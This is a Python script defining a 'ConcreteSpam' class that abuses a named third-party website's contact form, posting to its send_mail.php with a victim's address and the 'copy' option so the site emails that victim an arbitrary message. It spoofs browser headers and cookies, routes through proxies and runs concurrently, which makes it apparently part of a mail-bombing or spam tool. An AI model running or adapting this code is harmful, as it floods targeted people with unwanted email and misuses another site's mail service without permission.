from os.path import basename

import requests

from module import Spam


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        cookies = {
            '__utma': '24449833.1850274489.1677663959.1677663959.1677663959.1',
            '__utmc': '24449833',
            '__utmz': '24449833.1677663959.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)',
            '__utmt': '1',
            '__utmb': '24449833.3.10.1677663959',
        }

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            # 'Cookie': '__utma=24449833.1850274489.1677663959.1677663959.1677663959.1; __utmc=24449833; __utmz=24449833.1677663959.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmt=1; __utmb=24449833.3.10.1677663959',
            'Origin': 'http://www.billyfishstudios.com',
            'Pragma': 'no-cache',
            'Referer': 'http://www.billyfishstudios.com/contact.php',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
        }

        data = {
            'email_address': target,
            'message': self.get_text(),
            'copy': 'yes',
        }

        response = requests.post(
            'http://www.billyfishstudios.com/scripts/send_mail.php',
            cookies=cookies,
            headers=headers,
            data=data,
            verify=False,
            proxies=self.get_proxies()
        )
        return response


def main():
    s = 'Thanks for sending me a message'
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
